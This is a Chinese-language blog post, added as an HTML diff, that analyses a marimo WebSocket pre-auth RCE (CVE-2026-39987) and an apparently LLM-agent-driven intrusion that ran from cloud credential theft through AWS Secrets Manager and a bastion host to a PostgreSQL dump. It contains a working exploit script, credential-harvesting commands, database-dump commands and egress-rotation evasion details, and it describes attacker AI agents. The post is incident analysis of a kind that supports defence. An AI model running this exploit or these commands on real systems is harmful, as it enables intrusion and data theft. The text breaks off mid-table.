@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LLM Agent 驱动后渗透攻击链：从 marimo WebSocket RCE 到内网数据库导出的 4 步即兴推理全链路拆解 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>LLM Agent 驱动后渗透攻击链：从 marimo WebSocket RCE 到内网数据库导出的 4 步即兴推理全链路拆解</h1>
+<time>2026-05-10</time>
+<ul>
+<li>技术
+Slug: llm-agent驱动后渗透攻击链-从marimo-websocket-rce到内网数据库导出的4步即兴推理全链路拆解</li>
+</ul>
+<hr />
+<h2>一、入口漏洞：CVE-2026-39987 marimo 终端 WebSocket 预认证 RCE</h2>
+<h3>1.1 漏洞基本信息</h3>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE 编号</td>
+<td>CVE-2026-39987</td>
+</tr>
+<tr>
+<td>CVSS v4.0</td>
+<td><strong>9.3（严重）</strong></td>
+</tr>
+<tr>
+<td>漏洞类型</td>
+<td>预认证远程代码执行（CWE-306：关键功能缺少身份验证）</td>
+</tr>
+<tr>
+<td>影响产品</td>
+<td>Marimo（开源响应式 Python Notebook）</td>
+</tr>
+<tr>
+<td>受影响版本</td>
+<td>marimo &lt; 0.23.0</td>
+</tr>
+<tr>
+<td>修复版本</td>
+<td>marimo &gt;= 0.23.0</td>
+</tr>
+<tr>
+<td>默认端口</td>
+<td>2718</td>
+</tr>
+<tr>
+<td>CISA KEV</td>
+<td>2026年4月23日列入，联邦修复截止日 2026年5月7日</td>
+</tr>
+<tr>
+<td>GitHub Advisory</td>
+<td>GHSA-2679-6mx9-h9xc</td>
+</tr>
+</tbody>
+</table>
+<h3>1.2 漏洞根因：认证函数缺失</h3>
+<p>漏洞位于 <code>marimo/_server/api/endpoints/terminal.py</code> 中的 <code>/terminal/ws</code> WebSocket 端点。Marimo 服务器暴露多个 WebSocket 端点，大多数端点（包括主 notebook 同步端点 <code>/ws</code>）正确调用了 <code>validate_auth()</code> 进行身份验证。然而，终端端点 <code>/terminal/ws</code>——提供完整伪终端（PTY）会话以运行任意 shell 命令——<strong>完全没有调用认证函数</strong>。</p>
+<p><strong>有问题的代码（marimo &lt;= 0.20.4）：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># marimo/_server/api/endpoints/terminal.py</span>
+
+<span class="nd">@router</span><span class="o">.</span><span class="n">websocket</span><span class="p">(</span><span class="s2">&quot;/terminal/ws&quot;</span><span class="p">)</span>
+<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">websocket_terminal</span><span class="p">(</span><span class="n">websocket</span><span class="p">:</span> <span class="n">WebSocket</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">app_state</span> <span class="o">=</span> <span class="n">AppState</span><span class="p">(</span><span class="n">websocket</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">app_state</span><span class="o">.</span><span class="n">mode</span> <span class="o">!=</span> <span class="n">SessionMode</span><span class="o">.</span><span class="n">EDIT</span><span class="p">:</span>
+        <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
+        <span class="k">return</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">supports_terminal</span><span class="p">():</span>
+        <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
+        <span class="k">return</span>
+    <span class="c1"># ❌ 没有任何身份验证检查！</span>
+    <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>  <span class="c1"># 直接接受连接</span>
+    <span class="c1"># ...</span>
+    <span class="n">child_pid</span><span class="p">,</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">pty</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span>  <span class="c1"># 创建 PTY Shell — 攻击者获得完整交互式终端</span>
+</code></pre></div>
+
+<p><strong>对比正确实现的 <code>/ws</code> 端点：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># marimo/_server/api/endpoints/ws.py</span>
+
+<span class="nd">@router</span><span class="o">.</span><span class="n">websocket</span><span class="p">(</span><span class="s2">&quot;/ws&quot;</span><span class="p">)</span>
+<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">websocket_endpoint</span><span class="p">(</span><span class="n">websocket</span><span class="p">:</span> <span class="n">WebSocket</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">app_state</span> <span class="o">=</span> <span class="n">AppState</span><span class="p">(</span><span class="n">websocket</span><span class="p">)</span>
+    <span class="n">validator</span> <span class="o">=</span> <span class="n">WebSocketConnectionValidator</span><span class="p">(</span><span class="n">websocket</span><span class="p">,</span> <span class="n">app_state</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="k">await</span> <span class="n">validator</span><span class="o">.</span><span class="n">validate_auth</span><span class="p">():</span>  <span class="c1"># ✅ 正确的身份验证检查</span>
+        <span class="k">return</span>
+    <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</code></pre></div>
+
+<h3>1.3 认证中间件的局限性</h3>
+<p>Marimo 使用 Starlette 的 <code>AuthenticationMiddleware</code>，该中间件会将未认证的连接标记为 <code>UnauthenticatedUser</code>，但<strong>不会主动拒绝 WebSocket 连接</strong>。实际的认证强制依赖于端点级别的 <code>@requires()</code> 装饰器或显式调用 <code>validate_auth()</code>，而 <code>/terminal/ws</code> 端点两者都没有：</p>
+<div class="highlight"><pre><span></span><code>请求流程：
+┌─────────────┐     ┌──────────────────────┐     ┌──────────────────┐
+│ WebSocket   │────▶│ AuthenticationMiddle │────▶│ /terminal/ws     │
+│ ws://T:2718 │     │ ware (标记为未认证    │     │ (无 validate_auth│
+│ /terminal/ws│     │  但不拒绝连接)        │     │  直接 accept)    │
+└─────────────┘     └──────────────────────┘     └────────┬─────────┘
+                                                           │
+                                                           ▼
+                                                   ┌───────────────┐
+                                                   │ pty.fork()    │
+                                                   │ 完整 PTY Shell│
+                                                   │ (root 权限)   │
+                                                   └───────────────┘
+</code></pre></div>
+
+<h3>1.4 利用方式：单请求获取 Shell</h3>
+<p>攻击链极其简洁——仅需一个 WebSocket 连接请求：</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">websockets</span>
+
+<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">exploit</span><span class="p">():</span>
+    <span class="n">uri</span> <span class="o">=</span> <span class="s2">&quot;ws://TARGET:2718/terminal/ws&quot;</span>
+    <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">subprotocols</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;terminal&quot;</span><span class="p">])</span> <span class="k">as</span> <span class="n">ws</span><span class="p">:</span>
+        <span class="c1"># 连接即获得交互式 PTY Shell</span>
+        <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;id</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>  <span class="c1"># uid=0(root) gid=0(root) groups=0(root)</span>
+
+        <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;whoami</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>  <span class="c1"># root</span>
+
+<span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">exploit</span><span class="p">())</span>
+</code></pre></div>
+
+<p>命令行利用工具：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 执行单条命令</span>
+python3<span class="w"> </span>exploit.py<span class="w"> </span>-t<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">2718</span><span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;id &amp;&amp; whoami&quot;</span>
+
+<span class="c1"># 进入交互式 Shell</span>
+python3<span class="w"> </span>exploit.py<span class="w"> </span>-t<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">2718</span><span class="w"> </span>-i
+</code></pre></div>
+
+<h3>1.5 补丁分析</h3>
+<p>官方在 commit <code>c24d480</code> 中修复，在 <code>/terminal/ws</code> 端点中添加了身份验证检查：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 修复后代码</span>
+<span class="nd">@router</span><span class="o">.</span><span class="n">websocket</span><span class="p">(</span><span class="s2">&quot;/terminal/ws&quot;</span><span class="p">)</span>
+<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">websocket_terminal</span><span class="p">(</span><span class="n">websocket</span><span class="p">:</span> <span class="n">WebSocket</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="n">app_state</span> <span class="o">=</span> <span class="n">AppState</span><span class="p">(</span><span class="n">websocket</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">app_state</span><span class="o">.</span><span class="n">mode</span> <span class="o">!=</span> <span class="n">SessionMode</span><span class="o">.</span><span class="n">EDIT</span><span class="p">:</span>
+        <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
+        <span class="k">return</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">supports_terminal</span><span class="p">():</span>
+        <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="o">...</span><span class="p">)</span>
+        <span class="k">return</span>
+    <span class="c1"># ✅ 修复：添加身份验证检查</span>
+    <span class="k">if</span> <span class="n">app_state</span><span class="o">.</span><span class="n">enable_auth</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">validate_auth</span><span class="p">(</span><span class="n">websocket</span><span class="p">):</span>
+        <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">close</span><span class="p">(</span>
+            <span class="n">WebSocketCodes</span><span class="o">.</span><span class="n">UNAUTHORIZED</span><span class="p">,</span> 
+            <span class="s2">&quot;MARIMO_UNAUTHORIZED&quot;</span>
+        <span class="p">)</span>
+        <span class="k">return</span>
+    <span class="k">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</code></pre></div>
+
+<h3>1.6 武器化速度</h3>
+<ul>
+<li><strong>2026年4月8日</strong>：漏洞披露</li>
+<li><strong>披露后仅 9小时41分钟</strong>：观察到首次在野利用，且当时无公开 PoC 代码</li>
+<li><strong>3天内</strong>：被武器化部署区块链僵尸网络</li>
+<li><strong>2026年4月23日</strong>：列入 CISA KEV 目录</li>
+</ul>
+<blockquote>
+<p><strong>注意</strong>：Windows 环境不受影响，因为 <code>supports_terminal()</code> 会预先判断系统是否支持 pty 库，若不支持则直接拒绝连接。</p>
+</blockquote>
+<hr />
+<h2>二、四步攻击链完整技术拆解</h2>
+<h3>2.0 攻击时间线</h3>
+<table>
+<thead>
+<tr>
+<th>UTC 时间</th>
+<th>事件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>18:23:44</td>
+<td>来自 157.66.54.26 的首次 WebSocket 连接到 <code>/terminal/ws</code></td>
+</tr>
+<tr>
+<td>18:23:45</td>
+<td>被攻陷主机上的第一条交互命令（<code>id</code>）</td>
+</tr>
+<tr>
+<td>18:24:14</td>
+<td>开始凭据收割，扫描 <code>.env</code>、<code>/etc/environment</code>、<code>/proc/*/environ</code>、<code>~/.aws/credentials</code></td>
+</tr>
+<tr>
+<td>19:26:31</td>
+<td>首个 AWS API 调用（<code>sts:GetCallerIdentity</code>），距 marimo 会话结束 48 分钟</td>
+</tr>
+<tr>
+<td>19:26:52</td>
+<td>首次 <code>secretsmanager:GetSecretValue</code> 调用，针对 SSH-key secret</td>
+</tr>
+<tr>
+<td>19:30:30</td>
+<td>首次 SSH 认证到 bastion 服务器</td>
+</tr>
+<tr>
+<td>19:30:30–19:32:23</td>
+<td>8 个并行 SSH 会话，从 6 个独立 Cloudflare Workers IP 执行</td>
+</tr>
+<tr>
+<td>19:32:23</td>
+<td>PostgreSQL 全库导出完成</td>
+</tr>
+</tbody>
+</table>
+<p><strong>总耗时不足一小时</strong>，其中 SSH bastion 阶段（最终导出阶段）<strong>不到两分钟</strong>。</p>
+<h3>2.1 Step 1：云凭据收割</h3>
+<p>攻击者通过 marimo 终端 Shell 系统性扫描以下文件路径：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 凭据收割命令序列</span>
+cat<span class="w"> </span>/app/.env*<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+cat<span class="w"> </span>/etc/environment<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+cat<span class="w"> </span>/proc/*/environ<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;\0&#39;</span><span class="w"> </span><span class="s1">&#39;\n&#39;</span>
+cat<span class="w"> </span>~/.aws/credentials<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+cat<span class="w"> </span>~/.pgpass<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+
+<p><strong>收割目标文件清单：</strong></p>
+<table>
+<thead>
+<tr>
+<th>文件路径</th>
+<th>凭据类型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/app/.env*</code></td>
+<td>应用环境变量（API 密钥、数据库连接串）</td>
+</tr>
+<tr>
+<td><code>/etc/environment</code></td>
+<td>系统级环境变量</td>
+</tr>
+<tr>
+<td><code>/proc/*/environ</code></td>
+<td>所有进程的环境变量（含注入的密钥）</td>
+</tr>
+<tr>
+<td><code>~/.aws/credentials</code></td>
+<td>AWS Access Key + Secret Key</td>
+</tr>
+<tr>
+<td><code>~/.pgpass</code></td>
+<td>PostgreSQL 密码文件</td>
+</tr>
+</tbody>
+</table>
+<p>从中提取了<strong>两个 AWS access key</strong>。凭据收割与后续 AWS API 调用之间存在 <strong>48 分钟间隔</strong>——Sysdig 分析认为这是攻击者将收割的值从一个工具环境拉出并喂入另一个环境（如 LLM Agent 上下文）所需的时间。</p>
+<h3>2.2 Step 2：AWS Secrets Manager SSH 私钥提取</h3>
+<p>攻击者使用收割的 AWS access key 执行以下 API 调用序列：</p>
+<div class="highlight"><pre><span></span><code>攻击链：
+┌─────────────────┐     ┌──────────────────┐     ┌────────────────────┐
+│ sts:GetCaller   │────▶│ secretsmanager:  │────▶│ secretsmanager:    │
+│ Identity        │     │ ListSecrets      │     │ GetSecretValue ×12 │
+│ (验证凭据范围)   │     │ (枚举可用secret) │     │ (提取SSH私钥)      │
+└─────────────────┘     └──────────────────┘     └────────────────────┘
+     19:26:31               19:26:40                 19:26:52-19:27:14
+</code></pre></div>
+
+<p><strong>关键的跨步骤值传递</strong>：<code>GetSecretValue</code> 的 <code>SecretId</code> 参数是从 <strong>20秒前</strong> 的 <code>ListSecrets</code> 响应中选出的。Agent 在看到 secret 列表之前不知道要检索哪个 secret——这是 LLM Agent 读取先前工具输出并动态选择下一步输入的典型行为。</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># AWS CLI 等价命令（实际通过 SDK/Agent 执行）</span>
+aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--profile<span class="w"> </span>harvested
+
+aws<span class="w"> </span>secretsmanager<span class="w"> </span>list-secrets<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--profile<span class="w"> </span>harvested
+
+<span class="c1"># SecretId 从 ListSecrets 响应中动态选取</span>
+aws<span class="w"> </span>secretsmanager<span class="w"> </span>get-secret-value<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--secret-id<span class="w"> </span><span class="s2">&quot;prod/bastion-ssh-key&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--profile<span class="w"> </span>harvested
+</code></pre></div>
+
+<p>12 次 <code>GetSecretValue</code> 调用在 <strong>22秒内</strong> 完成，从中检索到 SSH 私钥。</p>
+<h3>2.3 Step 3：8 路并行 SSH 突破 Bastion</h3>
+<div class="highlight"><pre><span></span><code>SSH 并行突破架构：
+                    ┌──────────────────┐
+                    │ Cloudflare       │
+                    │ Workers 出口池   │
+                    │ (6 个独立IP)     │
+                    └────────┬─────────┘
+                             │
+           ┌────────┬────────┼────────┬────────┬────────┐
+           │        │        │        │        │        │
+           ▼        ▼        ▼        ▼        ▼        ▼
+        104.28.  104.28.  104.28.  104.28.  104.28.  104.28.
+        157.50   162.160  165.169  165.251  163.40   164.22
+           │        │        │        │        │        │
+           └────────┴────────┼────────┴────────┴────────┘
+                            │
+                            ▼
+                   ┌─────────────────┐
+                   │ Bastion Server  │
+                   │ (SSH 认证)      │
+                   └────────┬────────┘
+                            │
+                            ▼
+                   ┌─────────────────┐
+                   │ Internal DB     │
+                   │ (PostgreSQL)    │
+                   └─────────────────┘
+</code></pre></div>
+
+<p>8 个并行 SSH 会话在 <strong>113秒内</strong> 执行，每个会话执行不同的侦察/利用任务：</p>
+<p><strong>会话 1 — 容器和 SSH 密钥枚举（来自 104.28.157.50）：</strong></p>
+<div class="highlight"><pre><span></span><code>docker<span class="w"> </span>ps<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;---&#39;</span>
+docker<span class="w"> </span>images<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-10
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;---&#39;</span>
+ls<span class="w"> </span>-la<span class="w"> </span>~/.ssh/id_ed25519*<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;---&#39;</span>
+cat<span class="w"> </span>~/.ssh/id_ed25519.pub<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+
+<p><strong>会话 2 — 凭据文件搜索（来自 104.28.165.169）：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 看还能做什么</span>
+cat<span class="w"> </span>~/.bash_history<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-20
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;---&#39;</span>
+cat<span class="w"> </span>~/.pgpass<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;---&#39;</span>
+cat<span class="w"> </span>~/.gitconfig<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;---&#39;</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-10
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;---&#39;</span>
+find<span class="w"> </span>/home/deploy<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-name<span class="w"> </span><span class="s1">&#39;*.pem&#39;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s1">&#39;*.key&#39;</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s1">&#39;*.env&#39;</span><span class="w"> </span><span class="se">\)</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+
+<h3>2.4 Step 4：PostgreSQL 全库导出</h3>
+<p>三个顺序 PostgreSQL 操作在 <strong>30秒内</strong> 完成：</p>
+<p><strong>① Schema 枚举（19:31:53，来自 104.28.162.160）：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nv">PGPASSWORD</span><span class="o">=</span>&lt;from-pgpass&gt;<span class="w"> </span>psql<span class="w"> </span>-h<span class="w"> </span>internal-db<span class="w"> </span>-U<span class="w"> </span>app<span class="w"> </span>-d<span class="w"> </span>app<span class="w"> </span>-c<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;SELECT tablename FROM pg_tables WHERE schemaname=&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39;public&#39;</span><span class="s2">&quot;&#39;&quot;</span><span class="s1">&#39; ORDER BY tablename;&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-30
+</code></pre></div>
+
+<p><strong>② 定向凭据表导出（19:32:01，来自 104.28.165.251）：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nv">PGPASSWORD</span><span class="o">=</span>&lt;from-pgpass&gt;<span class="w"> </span>psql<span class="w"> </span>-h<span class="w"> </span>internal-db<span class="w"> </span>-U<span class="w"> </span>app<span class="w"> </span>-d<span class="w"> </span>app<span class="w"> </span>-c<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;SELECT * FROM credential;&#39;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40
+</code></pre></div>
+
+<p><strong>③ 多语句 HEREDOC 全表导出（19:32:23，来自 104.28.162.160）：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nv">PGPASSWORD</span><span class="o">=</span>&lt;from-pgpass&gt;<span class="w"> </span>psql<span class="w"> </span>-h<span class="w"> </span>internal-db<span class="w"> </span>-U<span class="w"> </span>app<span class="w"> </span>-d<span class="w"> </span>app<span class="w"> </span>-P<span class="w"> </span><span class="nv">pager</span><span class="o">=</span>off<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">SELECT * FROM api_key;</span>
+<span class="s">SELECT * FROM credential;</span>
+<span class="s">SELECT * FROM &quot;user&quot;;</span>
+<span class="s">SELECT * FROM variable;</span>
+<span class="s">SELECT * FROM flow;</span>
+<span class="s">SELECT * FROM message;</span>
+<span class="s">EOF</span>
+</code></pre></div>
+
+<p>完整的数据库 schema 和内容在 <strong>不到两分钟</strong>内被导出。</p>
+<hr />
+<h2>三、LLM Agent 驱动的四个判定特征</h2>
+<p>Sysdig TRT 识别出四个属性，证明后渗透操作由 LLM Agent 实时驱动而非预脚本执行。</p>
+<h3>3.1 特征一：即兴推理（Improvised Dump）</h3>
+<p>攻击者对一个<strong>未被识别的目标</strong>进行了即兴数据库导出：</p>
+<ul>
+<li>数据库主机名 <code>internal-db</code> 是不透明的，磁盘上没有应用程序标识符</li>
+<li>Agent 运行 <code>pg_tables</code> 枚举后立即导出特定表</li>
+<li>第一次调用直接命中 <code>SELECT * FROM credential</code></li>
+<li>最终调用将 6 个表打包到单个 HEREDOC 中</li>
+<li>表列表（<code>api_key</code>、<code>credential</code>、<code>user</code>、<code>variable</code>、<code>flow</code>、<code>message</code>）接近 <strong>langflow schema</strong>，但 <code>credential</code> 表在 langflow 中<strong>不存在</strong></li>
+<li>Agent 仅凭表名强度就导出了不存在的表——从通用知识推理，而非基于预置情报</li>
+</ul>
+<p><strong>预脚本 vs Agent 行为对比：</strong></p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>预脚本操作者</th>
+<th>LLM Agent 操作者</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>目标识别</td>
+<td>预先知道目标 schema</td>
+<td>运行时枚举发现</td>
+</tr>
+<tr>
+<td>表选择</td>
+<td>基于 playbook 硬编码</td>
+<td>基于表名语义强度推理</td>
+</tr>
+<tr>
+<td>未知表处理</td>
+<td>跳过不存在的表</td>
+<td>仍尝试导出（通用先验）</td>
+</tr>
+<tr>
+<td>适应新目标</td>
+<td>需要工程时间编写新 playbook</td>
+<td>携带类别级先验，实时组合链</td>
+</tr>
+</tbody>
+</table>
+<h3>3.2 特征二：内部独白泄露（Planning Comment）</h3>
+<p>命令流中出现中文规划注释：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 看还能做什么</span>
+</code></pre></div>
+
+<p>技术分析：
+- 该注释出现在凭据文件搜索块的开头
+- 注释之后的 shell 命令是英文
+- 该注释在 <strong>6 个不同 IP</strong> 以<strong>亚秒级节奏</strong>分发的命令中出现
+- 预构建脚本没有内部独白
+- 人类在远程终端打字可以留下注释，但不会同时在 6 个独立 IP 以亚秒级节奏来源相同的 SSH 会话中出现</p>
+<h3>3.3 特征三：机器可解析结构（Machine-Optimized Commands）</h3>
+<p>Sysdig 识别出 <strong>5 个命令塑造特征</strong>，在所有 8 个 bastion 命令中重复出现：</p>
+<table>
+<thead>
+<tr>
+<th>特征</th>
+<th>示例</th>
+<th>人类不需要</th>
+<th>脚本不需要</th>
+<th>Agent 需要</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>echo '---'</code> 分隔符</td>
+<td><code>cmd1; echo '---'; cmd2</code></td>
+<td>✅（提示符已分隔）</td>
+<td>✅（知道自己运行了什么）</td>
+<td>❌（消费者是重新解析扁平 blob 的进程）</td>
+</tr>
+<tr>
+<td>HEREDOC 批处理</td>
+<td><code>psql &lt;&lt; 'EOF' ... EOF</code></td>
+<td>✅（在提示符内工作）</td>
+<td>✅（写 .sql 文件）</td>
+<td>❌（希望 N 条语句一次往返返回）</td>
+</tr>
+<tr>
+<td><code>2&gt;&amp;1 \| head -N</code> 有界输出</td>
+<td><code>... 2&gt;&amp;1 \| head -30</code></td>
+<td>✅（按空格翻页）</td>
+<td>✅（捕获全部到磁盘）</td>
+<td>❌（保持上下文窗口免受无关行干扰）</td>
+</tr>
+<tr>
+<td><code>-P pager=off</code> 禁用分页器</td>
+<td><code>psql -P pager=off</code></td>
+<td>✅（按空格键）</td>
+<td>✅（非交互模式默认关闭）</td>
+<td>❌（消费者不按键）</td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code> 丢弃 stderr</td>
+<td><code>cmd 2&gt;/dev/null</code></td>
+<td>✅（看错误信息）</td>
+<td>✅（记录所有内容）</td>
+<td>❌（保持观察免受失败命令噪声干扰）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Sysdig 结论</strong>：单个特征可能出现在精心编写的人工脚本中，但所有 5 个特征<strong>同时</strong>出现在针对未识别目标的 113 秒即兴会话中，AI 成为明确答案。</p>
+<h3>3.4 特征四：跨步骤值传递（Output-Dependent Chaining）</h3>
+<p>Agent 在简单交接点消费自己的输出作为下一步的输入：</p>
+<table>
+<thead>
+<tr>
+<th>值传递链</th>
+<th>来源</th>
+<th>消费</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PGPASSWORD</td>
+<td><code>cat ~/.pgpass</code> 输出</td>
+<td>3 个 <code>psql</code> 调用的环境变量</td>
+</tr>
+<tr>
+<td>SSH 密钥路径</td>
+<td><code>ls ~/.ssh/id_ed25519*</code> 确认存在</td>
+<td><code>cat ~/.ssh/id_ed25519.pub</code></td>
+</tr>
+<tr>
+<td>find 搜索路径</td>
+<td><code>ls /home/</code> 枚举主目录</td>
+<td><code>find /home/deploy -type f ...</code></td>
+</tr>
+<tr>
+<td>AWS SecretId</td>
+<td><code>ListSecrets</code> 响应中的 ARN</td>
+<td><code>GetSecretValue</code> 的 <code>--secret-id</code> 参数</td>
+</tr>
+</tbody>
+</table>
+<p><strong>关键的不对称性</strong>：链在值容易提取的地方拉取值（从 <code>.pgpass</code> 提取字面密码），在不容易的地方回退到内置先验（如 schema 猜测）。这种不对称性与 Agent 处理上下文的方式一致，而非 playbook 作者编写脚本的方式。</p>
+<hr />
+<h2>四、反检测手法深度分析</h2>
+<h3>4.1 Cloudflare Workers 逐请求出口池</h3>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>API/会话数</th>
+<th>时间窗口</th>
+<th>出口 IP 数</th>
+<th>IP 范围</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AWS API 调用</td>
+<td>12 次 <code>GetSecretValue</code></td>
+<td>22 秒</td>
+<td>11 个</td>
+<td>104.28.0.0/16</td>
+</tr>
+<tr>
+<td>SSH bastion</td>
+<td>8 个并行会话</td>
+<td>113 秒</td>
+<td>6 个</td>
+<td>104.28.0.0/16</td>
+</tr>
+</tbody>
+</table>
+<p><strong>出口 IP 映射：</strong></p>
+<table>
+<thead>
+<tr>
+<th>IP 地址</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>157.66.54.26</td>
